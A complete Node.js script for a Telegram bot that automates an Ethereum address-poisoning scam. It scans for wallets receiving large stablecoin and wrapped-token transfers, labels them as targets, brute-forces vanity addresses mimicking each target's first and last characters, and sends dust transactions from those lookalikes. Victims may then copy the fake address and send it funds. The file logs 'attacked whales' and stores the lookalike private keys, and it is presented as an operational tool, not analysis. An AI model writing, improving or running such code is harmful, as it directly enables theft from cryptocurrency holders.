const { ethers } = require("ethers");
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
require('dotenv').config();

// --- 1. Database Setup ---
mongoose.connect(process.env.MONGO_URI);
const Target = mongoose.model('Target', {
    address: { type: String, unique: true },
    isDusted: { type: Boolean, default: false },
    isAttacked: { type: Boolean, default: false },
    vanityAddress: String,
    vanityPrivateKey: String,
    asset: String,
    amount: Number,
    timestamp: { type: Date, default: Date.now }
});

// --- 2. Vanity Worker ---
if (!isMainThread) {
    const { prefix, suffix } = workerData;
    (async () => {
        while (true) {
            const wallet = ethers.Wallet.createRandom();
            const addr = wallet.address.toLowerCase();
            if (addr.startsWith("0x" + prefix) && addr.endsWith(suffix)) {
                parentPort.postMessage({ address: wallet.address, privateKey: wallet.privateKey });
                break;
            }
        }
    })();
    return;
}

// --- 3. Connections & Providers ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);

let wsProvider;
let liveModeActive = false;
let userChatId = null;

const TOKENS = {
    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6 },
    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 },
    WBTC: { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8 },
    WETH: { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", dec: 18 }
};

// --- WebSocket Reconnect Logic (ethers v6 Fixed) ---
function connectWS() {
    try {
        console.log("🔌 Connecting to WebSocket...");
        wsProvider = new ethers.WebSocketProvider(process.env.RPC_WSS);

        // Access the underlying websocket safely
        wsProvider.on("error", (err) => console.log("❌ Provider Error:", err.message));

        // Use the websocket property to detect disconnects
        if (wsProvider.websocket) {
            wsProvider.websocket.onclose = (event) => {
                console.log(`⚠️ WebSocket closed (Code: ${event.code}). Reconnecting in 5s...`);
                setTimeout(connectWS, 5000);
            };
            wsProvider.websocket.onerror = (err) => {
                console.error("❌ WebSocket Error:", err.message);
            };
        }

        // Re-bind listeners if Live Mode was already active
        if (liveModeActive) {
            console.log("🔄 Re-syncing Live Mode listeners...");
            startLiveMode();
        }
    } catch (e) {
        console.error("Failed to connect WebSocket:", e.message);
        setTimeout(connectWS, 5000);
    }
}
connectWS();

// --- 4. Live Mode Logic ---
function startLiveMode() {
    console.log("📡 Live Mode Active: Filtering $1,000+ transfers...");
    
    Object.entries(TOKENS).forEach(([symbol, info]) => {
        const contract = new ethers.Contract(info.addr, [
            "event Transfer(address indexed from, address indexed to, uint256 value)"
        ], wsProvider);

        contract.on("Transfer", async (from, to, value) => {
            if (!liveModeActive || !userChatId) return;

            const amount = parseFloat(ethers.formatUnits(value, info.dec));
            
            if (amount >= 1000) {
                const msg = `🚨 **LIVE WHALE ALERT** 🚨\n\n` +
                            `💰 **${amount.toLocaleString()} ${symbol}** detected!\n` +
                            `📍 To: \`${to}\`\n\n` +
                            `Action: /dust_${to}`;
                
                bot.telegram.sendMessage(userChatId, msg, { parse_mode: 'Markdown' }).catch(() => {});
                
                await Target.findOneAndUpdate(
                    { address: to }, 
                    { isDusted: true, amount: amount, asset: symbol }, 
                    { upsert: true }
                ).catch(() => {});
            }
        });
    });
}

// --- 5. Manual Whale Fetcher ---
async function fetchRecentWhales(minRange, maxRange) {
    const apiKey = process.env.ETHERSCAN_KEY;
    const whales = [];
    
    for (const [symbol, info] of Object.entries(TOKENS)) {
        try {
            await new Promise(r => setTimeout(r, 300)); // Respect Etherscan rate limits

            const url = `https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=${info.addr}&page=1&offset=25&sort=desc&apikey=${apiKey}`;
            const res = await axios.get(url);
            
            // Safety Guard: Check if result is an array
            if (res.data && Array.isArray(res.data.result)) {
                res.data.result.forEach(tx => {
                    const amount = parseFloat(ethers.formatUnits(tx.value, info.dec));
                    if (amount >= minRange && amount <= maxRange) {
                        whales.push({ addr: tx.to, bal: amount, asset: symbol });
                    }
                });
            } else {
                console.log(`⚠️ Etherscan API Note (${symbol}):`, res.data.result || "No Data");
            }
        } catch (e) {
            console.error(`❌ Request failed for ${symbol}:`, e.message);
        }
    }
    return whales.sort((a, b) => b.bal - a.bal).slice(0, 10);
}

// --- 6. Bot Menus & Actions ---

const mainMenu = (ctx) => {
    const liveStatus = liveModeActive ? "🟢 Live Mode: ON" : "🔴 Live Mode: OFF";
    return ctx.reply("⚡ **Whale Control Center**", Markup.inlineKeyboard([
        [Markup.button.callback('🔍 Manual Scan', 'scan_menu')],
        [Markup.button.callback(liveStatus, 'toggle_live')],
        [Markup.button.callback('📜 View History', 'history_menu')]
    ]));
};

bot.start((ctx) => {
    userChatId = ctx.chat.id;
    mainMenu(ctx);
});

bot.action('toggle_live', (ctx) => {
    liveModeActive = !liveModeActive;
    if (liveModeActive && userChatId) {
        startLiveMode();
    } else {
        wsProvider.removeAllListeners(); // Stop listeners if turned off
    }
    ctx.answerCbQuery(`Live Mode ${liveModeActive ? 'Enabled' : 'Disabled'}`);
    mainMenu(ctx);
});

bot.action('scan_menu', async (ctx) => {
    await ctx.editMessageText("🎯 **Select Scan Range (USDT Value):**", Markup.inlineKeyboard([
        [Markup.button.callback('All Amounts', 'scan_0_99999999')],
        [Markup.button.callback('100 - 999 USDT', 'scan_100_999')],
        [Markup.button.callback('1,000 - 9,999 USDT', 'scan_1000_9999')],
        [Markup.button.callback('10,000+ USDT', 'scan_10000_99999999')],
        [Markup.button.callback('⬅️ Back', 'start_over')]
    ]));
});

bot.action('history_menu', async (ctx) => {
    await ctx.editMessageText("📜 **Select History Type:**", Markup.inlineKeyboard([
        [Markup.button.callback('Whales Found', 'hist_found')],
        [Markup.button.callback('Whales Attacked', 'hist_attacked')],
        [Markup.button.callback('⬅️ Back', 'start_over')]
    ]));
});

bot.action('start_over', (ctx) => mainMenu(ctx));

bot.action(/^scan_(\d+)_(\d+)$/, async (ctx) => {
    try {
        await ctx.answerCbQuery("🔎 Scanning Etherscan...");
    } catch (e) {}

    const min = parseInt(ctx.match[1]);
    const max = parseInt(ctx.match[2]);
    const statusMsg = await ctx.reply("⏳ Fetching data from Etherscan...");

    try {
        const list = await fetchRecentWhales(min, max);
        await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});

        if (list.length === 0) return ctx.reply("❌ No whales found in this range right now.");

        let msg = `💎 **TARGETS (${min}+ USDT)**\n\n`;
        for (const w of list) {
            msg += `💰 **${w.bal.toLocaleString()} ${w.asset}**\nAddr: \`${w.addr}\`\nAction: /dust_${w.addr}\n\n`;
            
            await Target.findOneAndUpdate(
                { address: w.addr }, 
                { isDusted: true, amount: w.bal, asset: w.asset }, 
                { upsert: true }
            ).catch(() => {});
        }
        ctx.reply(msg, { parse_mode: 'Markdown' });
    } catch (error) {
        ctx.reply("⚠️ Scan failed. API rate limits might have been reached.");
    }
});

bot.action(/hist_(found|attacked)/, async (ctx) => {
    const type = ctx.match[1];
    const query = type === 'found' ? { isDusted: true } : { isAttacked: true };
    const items = await Target.find(query).limit(10).sort({ timestamp: -1 });

    let msg = type === 'found' ? "📜 **FOUND WHALES**\n\n" : "⚔️ **ATTACKED WHALES**\n\n";
    if (items.length === 0) msg += "No records found.";
    
    items.forEach(i => {
        msg += `• \`${i.address}\` | ${i.amount || 0} ${i.asset || '?'}\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.hears(/^\/dust_(0x[a-fA-F0-9]{40})$/, async (ctx) => {
    const target = ctx.match[1];
    const prefix = target.substring(2, 6);
    const suffix = target.slice(-3);
    ctx.reply(`🛰️ **Targeting ${target}...**\nBrute-forcing vanity...`);

    const worker = new Worker(__filename, { workerData: { prefix, suffix } });
    worker.on('message', async (vanity) => {
        try {
            const fund = await masterWallet.sendTransaction({ to: vanity.address, value: ethers.parseEther("0.004") });
            await fund.wait();

            const vanitySigner = new ethers.Wallet(vanity.privateKey, provider);
            const dust = await vanitySigner.sendTransaction({ to: target, value: ethers.parseEther("0.0001") });
            
            await Target.findOneAndUpdate(
                { address: target }, 
                { isAttacked: true, vanityAddress: vanity.address, vanityPrivateKey: vanity.privateKey }, 
                { upsert: true }
            );

            ctx.reply(`✨ **Dust Sent!**\nTarget: \`${target}\`\n[Tx](https://etherscan.io/tx/${dust.hash})`, { parse_mode: 'Markdown' });
        } catch (e) { ctx.reply(`❌ Error: ${e.message}`); }
    });
});

bot.launch().then(() => console.log("🤖 Bot is Online!"));